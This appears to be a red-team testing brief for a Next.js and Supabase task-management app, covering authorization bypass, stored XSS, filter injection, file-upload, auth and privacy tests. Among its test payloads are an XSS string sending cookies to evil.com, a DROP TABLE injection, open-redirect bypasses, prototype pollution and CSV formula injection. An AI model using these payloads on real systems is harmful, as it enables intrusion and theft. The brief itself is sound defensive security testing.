# Comfy Board — Red Team Testing Brief

Target: Next.js 15 + Supabase (PostgREST + RLS + Auth + Storage)
All mutations happen client-side via `@supabase/ssr` browser client (anon key).
No API routes. No server actions. Single auth callback at `/auth/callback`.

---

## 1. RLS BYPASS — IDOR via Supabase PostgREST

All 26 tables use `auth.uid() = user_id` RLS policies. The test is whether a logged-in user can read/write another user's data by crafting direct PostgREST requests.

### Tables to target

| Table | Fields to test | Attack vector |
|---|---|---|
| `projects` | id, user_id | Query with another user's project UUID |
| `project_tasks` | project_id, user_id | Insert a task into another user's project |
| `subtasks` | task_id, user_id | Insert subtask under another user's task |
| `contacts` | user_id | Read another user's contact list |
| `user_settings` | user_id | Read/overwrite another user's feature settings |
| `activity_log` | user_id | Read another user's activity history |
| `monitored_tasks` | user_id | Read another user's monitoring alerts |
| `time_logs` | user_id | Read another user's time tracking data |
| `roadmap_data` | user_id | Read/write another user's roadmap |
| `templates` | user_id | Steal another user's project templates |
| `quick_tasks` | user_id | Read/write another user's quick capture tasks |
| `week_tasks` | user_id | Read another user's weekly calendar |
| `deadlines` | user_id | Read another user's deadlines |
| `routine_tasks` | user_id | Read daily routine |
| `weekly_routine_tasks` | user_id | Read weekly routine |
| `monthly_routine_tasks` | user_id | Read monthly routine |
| `yearly_routine_tasks` | user_id | Read yearly routine |

### Test procedure

1. Create two test accounts (A and B)
2. From account A, note a project UUID
3. From account B, attempt direct PostgREST calls:
   ```
   GET /rest/v1/projects?id=eq.<A's UUID>
   GET /rest/v1/project_tasks?project_id=eq.<A's UUID>
   POST /rest/v1/project_tasks  { project_id: <A's UUID>, user_id: <A's ID>, ... }
   PATCH /rest/v1/projects?id=eq.<A's UUID>  { title: "hacked" }
   DELETE /rest/v1/projects?id=eq.<A's UUID>
   ```
4. All should return empty or 403. Any data returned = critical finding.

### contact_tag_links — JOIN-based RLS

This table's RLS policy checks ownership via a JOIN to `contacts`, not a direct `user_id` column. Test:
- Insert a tag link referencing a contact_id belonging to another user
- Check if the JOIN-based policy actually blocks it

### SECURITY DEFINER functions

Three RPC functions bypass RLS. Test each:

**`reorder_rows(p_table, p_ids, p_user_id)`**
- Has a table name allowlist: `routine_tasks`, `weekly_routine_tasks`, `monthly_routine_tasks`, `project_tasks`, `subtasks`, `week_tasks`, `projects`, `quick_tasks`
- Try: `p_table = 'user_settings'` (not in allowlist — should reject)
- Try: `p_table = 'projects; DROP TABLE projects; --'` (SQL injection in table name — `format('%I')` should prevent)
- Try: passing another user's IDs in `p_ids` — the function has `auth.uid() IS DISTINCT FROM p_user_id` check
- Try: `p_user_id = <other user's ID>` — should be blocked by auth.uid() check

**`reorder_subtasks(p_ids, p_user_id)`**
- Same auth.uid() check — try with another user's subtask IDs

**`cleanup_activity_log(p_user_id, p_keep)`**
- Try: `p_user_id = <other user's ID>` — attempt to delete their activity log
- Try: `p_keep = -1` or `p_keep = 0` — edge case to delete all entries

---

## 2. XSS — Stored Cross-Site Scripting

React escapes by default, but test every user-controlled text field rendered in the UI.

### Input vectors (all stored in DB, rendered on page)

| Field | Table | Where rendered | Test payload |
|---|---|---|---|
| Project title | `projects.title` | Sidebar, projects list, project detail, kanban, search results | `<img src=x onerror=alert(1)>` |
| Project description | `projects.description` | Project detail page | `"><script>alert(1)</script>` |
| Task name | `project_tasks.name` | Task list, kanban cards, search, week calendar | `<svg onload=alert(1)>` |
| Task notes | `project_tasks.notes` | Task detail expand | `javascript:alert(1)` |
| Subtask name | `subtasks.name` | Subtask checklist, kanban expand | `<img src=x onerror=alert(1)>` |
| Routine task text | `routine_tasks.text` | Routine page, week calendar | `<script>alert(document.cookie)</script>` |
| Deadline label | `deadlines.label` | Deadlines page | `<iframe src=javascript:alert(1)>` |
| Contact name | `contacts.name` | Contacts panel | `<img src=x onerror=alert(1)>` |
| Contact notes | `contacts.notes` | Contact detail | `"><script>fetch('https://evil.com/'+document.cookie)</script>` |
| Contact email | `contacts.email` | Contact card | `" onclick=alert(1) x="` |
| Contact company | `contacts.company_position` | Contact card | Event handler injection |
| Tag name | `contact_tags.name` | Tag chips | `<marquee onstart=alert(1)>` |
| Template name | `templates.name` | Template modal | Injection payload |
| Week day title | `week_days.title` | Weekly calendar header | Injection payload |
| Quick task name | `quick_tasks.name` | Quick capture list | Injection payload |
| Activity detail | `activity_log.detail` | Activity/stats page | Injection payload |
| Roadmap data | `roadmap_data` (JSON) | Roadmap page | Nested injection in JSON fields |
| Monitored task notes | `monitored_tasks.notes` | Monitoring panel | Injection payload |

### dangerouslySetInnerHTML

One usage at `app/layout.tsx:34` — inline script for theme initialization from localStorage. The script is static, but test:
- Set `localStorage.setItem('comfy-theme', "';alert(1);//")` and reload — does the theme-init script break out?
- The script does `document.documentElement.setAttribute('data-theme', t)` — test if a crafted theme value can inject into HTML attributes

### Import-based XSS

Upload a JSON file with XSS payloads in project/task names:
```json
{
  "title": "<img src=x onerror=alert('imported-xss')>",
  "tasks": [
    { "name": "<script>alert('task-xss')</script>", "est_minutes": 0 }
  ]
}
```
Check if the imported data renders unsafely when the project is viewed.

### CSV import XSS
```csv
Name,Type,Progress
"<img src=x onerror=alert(1)>",task,0
```

---

## 3. PostgREST FILTER INJECTION

**Priority target**: `components/SearchModal.tsx` line 50.

The search modal interpolates user input into a PostgREST `.or()` filter string:
```typescript
const term = `%${q.trim()}%`;
// Then used in:
.or(`name.ilike.${term},notes.ilike.${term}`)
```

### Test payloads

Try these as search queries:
- `%,user_id.neq.` — attempt to add a filter condition that leaks all users' data
- `%25),user_id.neq.00000000-0000-0000-0000-000000000000;--` — SQL injection through filter
- `test,id.not.is.null` — try to alter the OR filter semantics
- `,` — just a comma to see if it splits the filter
- `%25%22%20OR%201=1--` — URL-encoded injection attempt
- `test),true,(name.ilike.%25` — attempt to break out of the `.or()` and inject a tautology

Expected: no data from other users should ever appear. If any cross-user data appears, it's a critical RLS+filter bypass.

---

## 4. FILE UPLOAD ATTACKS

Bucket: `task-files` (private since migration v20).
Upload path: `<userId>/<entityId>-<timestamp>.<ext>`

### Test vectors

| Test | What to upload | Expected behavior |
|---|---|---|
| SVG with script | `evil.svg` containing `<script>alert(1)</script>` | Must be served as attachment download, never rendered inline |
| HTML file | `evil.html` with JS | Must be served as attachment, never rendered |
| Path traversal name | File named `../../../etc/passwd` | Extension sanitizer should strip to `etcpasswd` |
| Double extension | `evil.jpg.html` | Should be served based on final extension |
| Large file | 10.1MB file | Should be rejected client-side (10MB limit) |
| Zero-byte file | Empty file | Check handling |
| MIME mismatch | .jpg extension but HTML content | `nosniff` header should prevent browser sniffing |
| Polyglot | JPEG/JS polyglot file | Test if served inline |

### Storage access control

1. From user A, upload a file and note the storage path
2. From user B, try to:
   - Generate a signed URL for A's file
   - Download A's file directly via the storage API
   - List files in A's folder
   - Delete A's file
3. Try accessing files without authentication (anon key only, no session)

### Legacy public URLs

Files uploaded before migration v20 may still have public URLs stored in `file_url`. Test:
- Can these URLs still be accessed without auth?
- Are they enumerable?

---

## 5. AUTHENTICATION ATTACKS

### Brute force

- Supabase Auth rate limits are configured per-project. Test:
  - 10+ rapid login attempts with wrong passwords
  - Check if rate limiting kicks in
  - Check if there's any account lockout

### Password reset flow

- `app/auth/reset/page.tsx` — minimum 8 chars enforced client-side only
- Try resetting password with < 8 chars by bypassing client-side check (direct API call)
- Test if Supabase enforces minimum length server-side

### Session management

- Middleware at `middleware.ts` calls `supabase.auth.getUser()` on every request
- Test: send requests with expired/tampered JWT tokens
- Test: modify the JWT payload (change `sub` to another user's ID) — Supabase should reject invalid signatures

### Auth callback

- `app/auth/callback/route.ts` has open redirect protection: `const next = /^\/(?!\/)/.test(requested) ? requested : "/";`
- Test bypass attempts:
  - `?next=//evil.com` — double slash
  - `?next=/\evil.com` — backslash
  - `?next=/%2Fevil.com` — URL-encoded double slash
  - `?next=/evil.com` — single slash then domain (this would pass the regex but go to `/evil.com` path on the same origin, so actually safe)
  - `?next=javascript:alert(1)` — should fail the regex (no leading `/`)
  - `?next=//evil.com%2F..%2F` — encoded path traversal

### Sign-up abuse

- Can someone create unlimited accounts?
- Is email confirmation actually enforced before the account becomes usable?
- Try sign-up with disposable email domains

---

## 6. MISSING SECURITY HEADERS

### No Content-Security-Policy

The app has no CSP header (`next.config.js:38-54`). This means:
- Inline scripts execute freely
- External scripts can be injected if XSS is found
- No restriction on where data can be sent

Test: if any XSS vector succeeds, can it exfiltrate data to an external domain?

### What's present

- `X-Frame-Options: DENY` — clickjacking protection (good)
- `X-Content-Type-Options: nosniff` — MIME sniffing protection (good)
- `Strict-Transport-Security` — HSTS (good)
- `Referrer-Policy: strict-origin-when-cross-origin` (good)
- `Permissions-Policy: camera=(), microphone=(), geolocation=()` (good)

---

## 7. DATA LEAKAGE

### Google Calendar export

`components/GCalButton.tsx` constructs Google Calendar URLs with user task data in query parameters:
- Task title, dates, and notes are passed as URL search params
- This leaks task content to Google via the URL
- Test: create a task with sensitive content, export to GCal, check what Google receives

### Supabase anon key exposure

`NEXT_PUBLIC_SUPABASE_URL` and `NEXT_PUBLIC_SUPABASE_ANON_KEY` are in the client bundle (expected for Supabase's architecture, but:)
- Verify the anon key cannot bypass RLS when used directly
- Verify the anon key cannot access the Supabase management API
- Test: use the anon key + URL to enumerate tables/schemas via PostgREST

### Realtime subscriptions

`components/Sidebar.tsx:138` subscribes to `postgres_changes` on `projects` table with `filter: user_id=eq.<userId>`.
- Test: subscribe without a filter — can you see all users' project changes?
- Test: subscribe with another user's ID in the filter
- Supabase realtime should respect RLS, but verify

### localStorage data

Feature settings are cached in `comfy-settings-cache`. If a shared/public computer:
- Can the next user read the previous user's settings, feature flags, project UUIDs?
- `retro_project` and `roadmap_project` store project UUIDs in localStorage

---

## 8. IMPORT FUNCTIONALITY ABUSE

Two import paths exist with different validation levels.

### ImportModal (components/ImportModal.tsx)

Has protections:
- `MAX_FILE_SIZE = 2 * 1024 * 1024` (2MB)
- `MAX_TASKS = 500`
- `clampStr()` truncates strings to 200 chars
- `clampInt()` clamps integers

### Projects page import (app/projects/page.tsx:266-405)

Less visible validation. Test:
- Upload a JSON with 10,000 tasks — is there a limit?
- Upload a JSON with deeply nested subtasks
- Upload a JSON with extremely long strings (1MB title)
- Upload a JSON with numeric overflow values
- Upload a JSON with `__proto__` pollution:
  ```json
  { "title": "test", "__proto__": { "isAdmin": true }, "constructor": { "prototype": { "isAdmin": true } } }
  ```
- Upload a JSON where `tasks` is not an array but an object
- Upload a malformed JSON that causes `JSON.parse` to hang (deeply nested brackets)

### CSV import edge cases

- CSV with 100,000 rows
- CSV with formula injection: `=CMD('calc')` or `=HYPERLINK("http://evil.com")` in fields (relevant if data is later exported to CSV/Excel)
- CSV with null bytes in fields
- CSV with mixed encodings

---

## 9. CLIENT-SIDE LOGIC MANIPULATION

Since all mutations happen client-side, the browser's dev tools can intercept and modify any Supabase call.

### Progress manipulation

- Task progress is a number 0-100 — what happens with negative values? 999? NaN?
- Can progress be set on archived tasks?

### Sort order manipulation

- `reorder_rows` RPC accepts an array of IDs — what if IDs from another user are included?
- What if the same ID appears twice?
- What if non-existent IDs are passed?

### Timer manipulation

- `timer_started_at` is a timestamp — can it be set to a past date to inflate time tracking?
- Can `elapsed_seconds` be set to negative values?

### Archived data access

- Tasks have `archived_at` field — can archived tasks be un-archived by setting it to null?
- Are archived tasks excluded from all queries, or only some?

---

## 10. BUSINESS LOGIC BUGS

### Feature toggle bypass

Settings are stored in `user_settings` table and cached in localStorage (`comfy-settings-cache`).
- Can a free-tier user enable pro features by:
  1. Directly inserting feature flags into `user_settings` via PostgREST?
  2. Modifying `comfy-settings-cache` in localStorage?
- If feature checks are client-side only, the backend may still accept writes for "pro" tables

### Deletion cascade

Projects use `ON DELETE CASCADE` — test:
- Delete a project and verify all child data is actually removed
- Check if orphaned records exist (subtasks without parent tasks, etc.)
- Check if the cascade respects RLS (can't cascade-delete another user's data)

### Race conditions

- Two browsers editing the same task simultaneously — who wins?
- Rapid-fire drag-and-drop reorder — can sort_order become inconsistent?
- Creating a project while import is running — sort_order collision?

---

## 11. INFRASTRUCTURE RECONNAISSANCE

### Supabase project discovery

From the `NEXT_PUBLIC_SUPABASE_URL`:
- Try accessing `/rest/v1/` to list available tables
- Try accessing `/auth/v1/` endpoints
- Try accessing `/storage/v1/` endpoints
- Try accessing `/realtime/v1/` websocket
- Check if the Supabase dashboard is accessible

### Error information disclosure

- Send malformed requests to PostgREST — does it reveal schema information?
- Send invalid UUIDs — does the error message reveal column names or types?
- Trigger a 500 error — does it reveal stack traces or internal paths?

### .env file

- Is `.env` in `.gitignore`?
- Can `.env` be accessed via `/.env` or `/api/.env`?
- Check if `NEXT_PUBLIC_` prefix is correct (no non-public secrets leaked to client)

---

## 12. RGPD/CNIL SPECIFIC TESTS

### Data export completeness

Test if the data export feature actually exports ALL user data:
- Projects, tasks, subtasks
- Routines (daily, weekly, monthly, yearly) and checks
- Contacts and tags
- Quick tasks
- Week tasks and day notes
- Deadlines
- Templates
- Activity log
- Time logs
- Monitored tasks
- Roadmap data
- Settings
- Uploaded files

Any missing table = RGPD Article 15 (right of access) violation.

### Account deletion completeness

When account deletion is implemented:
- Does it remove data from ALL 26 tables?
- Does it remove uploaded files from storage?
- Does it remove the Supabase Auth user record?
- Is the deletion immediate or delayed? If delayed, is the user informed of the retention period?
- Can the user still log in during a grace period?
- Are there any orphaned references after deletion?

### Data minimization

- Are `created_at` timestamps on all tables necessary?
- Is `activity_log` retained indefinitely? Should it have auto-cleanup?
- Is `elapsed_seconds` considered personal data? (work patterns = behavioral data)

### Consent

- Is there a cookie banner? (localStorage is not cookies, but CNIL considers localStorage tracking)
- Is there consent for Google Calendar data sharing?
- Is the privacy policy accessible before sign-up?
